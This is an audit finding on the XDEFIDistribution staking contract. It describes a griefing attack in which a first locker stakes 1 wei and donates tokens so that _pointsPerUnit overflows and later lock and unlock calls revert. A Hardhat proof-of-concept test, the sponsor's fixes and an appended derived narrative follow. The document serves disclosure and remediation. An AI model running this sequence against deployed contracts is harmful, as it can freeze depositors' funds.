---
id: 1516
severity: "High"
---

# Malicious early user/attacker can malfunction the contract and even freeze users’ funds in edge cases

## Description

```solidity
_pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached);
```

In the current implementation, `_pointsPerUnit` can be changed in `updateDistribution()` which can be called by anyone.

A malicious early user can `lock()` with only `1 wei` of XDEFI and makes `_pointsPerUnit` to be very large, causing future users not to be able to `lock()` and/or `unlock()` anymore due to overflow in arithmetic related to `_pointsMultiplier`.

As a result, the contract can be malfunctioning and even freeze users’ funds in edge cases.

## Proof of Concept

Given:
* bonusMultiplierOf[30 days] = 100
* Alice `lock()` `1 wei` of XDEFI for 30 days as the first user of the contract. Got `1` units, and `totalUnits` now is `1`;
* Alice sends `170141183460469 wei` of `XDEFI` to the contract and calls `updateDistribution()`:
  ```solidity
  _pointsPerUnit += ((170141183460469 * 2**128) / 1);
  ```
* Bob tries to `lock()` `1,100,000 * 1e18` of `XDEFI` for 30 days, the tx will fail, as `_pointsPerUnit * units` overflows;
* Bob `lock()` `1,000,000 * 1e18` of `XDEFI` for 30 days;
* The rewarder sends `250,000 * 1e18` of `XDEFI` to the contract and calls `updateDistribution()`:
  ```solidity
  _pointsPerUnit += ((250_000 * 1e18 * 2**128) / (1_000_000 * 1e18 + 1));
  ```
* 30 days later, Bob tries to call `unlock()`, the tx will fail, as `_pointsPerUnit * units` overflows.

## Recommendation

Uniswap v2 solved a similar problem by sending the first 1000 lp tokens to the zero address.

The same solution should work here, i.e., on constructor set an initial amount (like 1e8) for `totalUnits`

```solidity
constructor (address XDEFI_, string memory baseURI_, uint256 zeroDurationPointBase_) ERC721("Locked XDEFI", "lXDEFI") {
    require((XDEFI = XDEFI_) != address(0), "INVALID_TOKEN");
    owner = msg.sender;
    baseURI = baseURI_;
    _zeroDurationPointBase = zeroDurationPointBase_;

    totalUnits = 100_000_000;
}
```

This is a great catch! I just tested it:

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

const totalSupply = '240000000000000000000000000';

const toWei = (value, add = 0, sub = 0) => (BigInt(value) * 1_000_000_000_000_000_000n + BigInt(add) - BigInt(sub)).toString();

describe("XDEFIDistribution", () => {
    it("Can overflow _pointsPerUnit", async () => {
        const [god, alice, bob] = await ethers.getSigners();

        const XDEFI = await (await (await ethers.getContractFactory("XDEFI")).deploy("XDEFI", "XDEFI", totalSupply)).deployed();
        const XDEFIDistribution = await (await (await ethers.getContractFactory("XDEFIDistribution")).deploy(XDEFI.address, "https://www.xdefi.io/nfts/", 0)).deployed();

        // Give each account 2,000,000 XDEFI
        await (await XDEFI.transfer(alice.address, toWei(2_000_000))).wait();
        await (await XDEFI.transfer(bob.address, toWei(2_000_000))).wait();

        // bonusMultiplierOf[30 days] = 100
        await (await XDEFIDistribution.setLockPeriods([2592000], [100])).wait();

        // 1. Alice lock() 1 wei of XDEFI for 30 days as the first user of the contract. Got 1 units, and totalUnits now is 1;
        await (await XDEFI.connect(alice).approve(XDEFIDistribution.address, 1)).wait();
        await (await XDEFIDistribution.connect(alice).lock(1, 2592000, alice.address)).wait();
        expect(await XDEFIDistribution.balanceOf(alice.address)).to.equal('1');
        const nft1 = (await XDEFIDistribution.tokenOfOwnerByIndex(alice.address, 0)).toString();
        expect((await XDEFIDistribution.positionOf(nft1)).units).to.equal(1);

        // 2. Alice sends 170141183460469 wei of XDEFI to the contract and calls updateDistribution()
        await (await XDEFI.connect(alice).transfer(XDEFIDistribution.address, 170141183460469)).wait();
        await (await XDEFIDistribution.connect(alice).updateDistribution()).wait();

        // 3. Bob tries to lock() 1,100,000 * 1e18 of XDEFI for 30 days, the tx will fail, as _pointsPerUnit * units overflows
        await (await XDEFI.connect(bob).approve(XDEFIDistribution.address, toWei(1_100_000))).wait();
        await expect(XDEFIDistribution.connect(bob).lock(toWei(1_100_000), 2592000, bob.address)).to.be.revertedWith("_toInt256Safe failed");

        // 4. Bob lock() 1,000,000 * 1e18 of XDEFI for 30 days
        await (await XDEFI.connect(bob).approve(XDEFIDistribution.address, toWei(1_000_000))).wait();
        await (await XDEFIDistribution.connect(bob).lock(toWei(1_000_000), 2592000, bob.address)).wait();
        expect(await XDEFIDistribution.balanceOf(bob.address)).to.equal('1');
        const nft2 = (await XDEFIDistribution.tokenOfOwnerByIndex(bob.address, 0)).toString();
        expect((await XDEFIDistribution.positionOf(nft2)).units).to.equal(toWei(1_000_000));

        // 5. The rewarder sends 250,000 * 1e18 of XDEFI to the contract and calls updateDistribution()
        await (await XDEFI.transfer(XDEFIDistribution.address, toWei(250_000))).wait();
        await (await XDEFIDistribution.updateDistribution()).wait();

        // 6. 30 days later, Bob tries to call unlock(), the tx will fail, as _pointsPerUnit * units overflows.
        await hre.ethers.provider.send('evm_increaseTime', [2592000]);
        await expect(XDEFIDistribution.connect(bob).unlock(nft2, bob.address)).to.be.revertedWith("_toInt256Safe failed");
    });
});
```

While I do like the suggestion to to `totalUnits = 100_000_000;` in the constructor, it will result “uneven” numbers due to the `totalUnits` offset. I wonder if I can resolve this but just reducing `_pointsMultiplier` to `uint256(2**96)` as per <https://github.com/ethereum/EIPs/issues/1726#issuecomment-472352728>.

OK, I think I can solve this with `_pointsMultiplier = uint256(2**72)`:

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

const totalSupply = '240000000000000000000000000';

const toWei = (value, add = 0, sub = 0) => (BigInt(value) * 1_000_000_000_000_000_000n + BigInt(add) - BigInt(sub)).toString();

describe("XDEFIDistribution", () => {
    it("Can overflow _pointsPerUnit", async () => {
        const [god, alice, bob] = await ethers.getSigners();

        const XDEFI = await (await (await ethers.getContractFactory("XDEFI")).deploy("XDEFI", "XDEFI", totalSupply)).deployed();
        const XDEFIDistribution = await (await (await ethers.getContractFactory("XDEFIDistribution")).deploy(XDEFI.address, "https://www.xdefi.io/nfts/", 0)).deployed();

        // Give each account 100M XDEFI
        await (await XDEFI.transfer(alice.address, toWei(100_000_000))).wait();
        await (await XDEFI.transfer(bob.address, toWei(100_000_000))).wait();

        // bonusMultiplierOf[30 days] = 255
        await (await XDEFIDistribution.setLockPeriods([2592000], [255])).wait();

        // 1. Alice lock() 1 wei of XDEFI for 30 days as the first user of the contract. Got 1 units, and totalUnits now is 1
        await (await XDEFI.connect(alice).approve(XDEFIDistribution.address, 1)).wait();
        await (await XDEFIDistribution.connect(alice).lock(1, 2592000, alice.address)).wait();
        expect(await XDEFIDistribution.balanceOf(alice.address)).to.equal('1');
        const nft1 = (await XDEFIDistribution.tokenOfOwnerByIndex(alice.address, 0)).toString();
        expect((await XDEFIDistribution.positionOf(nft1)).units).to.equal(2);

        // 2. Alice sends 100M XDEFI minus 1 wei to the contract and calls updateDistribution()
        await (await XDEFI.connect(alice).transfer(XDEFIDistribution.address, toWei(100_000_000, 0, 1))).wait();
        await (await XDEFIDistribution.connect(alice).updateDistribution()).wait();

        // 3. Bob can lock() 100M XDEFI for 30 days
        await (await XDEFI.connect(bob).approve(XDEFIDistribution.address, toWei(100_000_000))).wait();
        await (await XDEFIDistribution.connect(bob).lock(toWei(100_000_000), 2592000, bob.address)).wait();
        expect(await XDEFIDistribution.balanceOf(bob.address)).to.equal('1');
        const nft2 = (await XDEFIDistribution.tokenOfOwnerByIndex(bob.address, 0)).toString();
        expect((await XDEFIDistribution.positionOf(nft2)).units).to.equal(toWei(255_000_000));

        // 4. The rewarder sends 40M XDEFI to the contract and calls updateDistribution()
        await (await XDEFI.transfer(XDEFIDistribution.address, toWei(40_000_000))).wait();
        await (await XDEFIDistribution.updateDistribution()).wait();

        // 5. 30 days later, Bob can call unlock()
        await hre.ethers.provider.send('evm_increaseTime', [2592000]);
        await (await XDEFIDistribution.connect(bob).unlock(nft2, bob.address)).wait();
    });
}
```

In the [release candidate contract](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol), in order to preserve the math (formulas), at the cost of some accuracy, we went with a [`_pointsMultiplier` of 72 bits](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L23).

Also, a [minimum units locked](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L53) is enforced, to prevent “dust” from creating a very very high `_pointsPerUnit`.

Tests were written in order to stress test the contract against the above extreme cases.

Further, a “no-going-back” [emergency mode setter](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L100) was implemented that allows (but does not force) users to [withdraw only their deposits](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L147) without any of the funds distribution math from being expected, in the event that some an edge case does arise.

fantastic finding, agreed with the proposed severity!

The sponsor fixes seem adequate: a lower `_poinsMultiplier`, a minimum lock and an emergency mode that disables reward math, somewhat similar to emergency withdraw functions in contracts like masterchef.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an arithmetic overflow in the reward‑distribution mechanism of the XDEFIDistribution contract. The contract keeps a variable _pointsPerUnit that is increased in updateDistribution() by adding (newXDEFI * _pointsMultiplier) / totalUnitsCached. Because totalUnits starts at zero and is increased only when users lock tokens, a malicious early user can call lock() with the smallest possible amount (1 wei), resulting in totalUnits becoming 1. Subsequent calls to updateDistribution() with a non‑trivial amount of XDEFI cause the numerator to be multiplied by a large _pointsMultiplier (2**128 in the original code). When totalUnits is only 1, the division yields a very large _pointsPerUnit, which then overflows when later multiplied by the units of a normal lock in the expressions that compute rewards or unlock amounts. The overflow is triggered either during a new lock (the check _pointsPerUnit * units) or during unlock, causing the transaction to revert with an internal error such as “_toInt256Safe failed”. As a result, after the attack the contract refuses new deposits and prevents existing locked positions from being unlocked, effectively freezing users’ funds. The issue appears only in edge cases where the first lock is extremely small and subsequent deposits are large, making it hard to notice during ordinary testing because normal usage quickly establishes a reasonable totalUnits value. It was discovered during a formal audit and reproduced with fuzz‑style unit tests that deliberately executed the extreme sequence. The bug belongs to the class of “initial‑state‑driven arithmetic overflow” or “division‑by‑very‑small denominator scaling overflow”, where insufficient initialization of a scaling denominator allows a malicious actor to drive the scaling factor to extreme values. From a user’s perspective the contract behaves contrary to expectations: a user who locks tokens expects to receive an NFT representing a deposit and later to withdraw the same amount plus rewards, but instead the lock transaction may succeed while any later lock or unlock reverts, leaving the displayed balance unchanged or the NFT unusable. The contract violates the business logic that deposits should be always withdrawable after the lock period. Mitigation consists of initializing totalUnits with a sufficiently large non‑zero value (e.g., 100 000 000), reducing the size of _pointsMultiplier to avoid overflow, enforcing a minimum lock amount to prevent “dust” deposits, and providing an emergency mode that disables the reward‑math and allows direct withdrawals. These changes prevent the scaling factor from becoming excessively large and ensure that the contract remains operable even if an attacker attempts to exploit the initial‑state weakness.
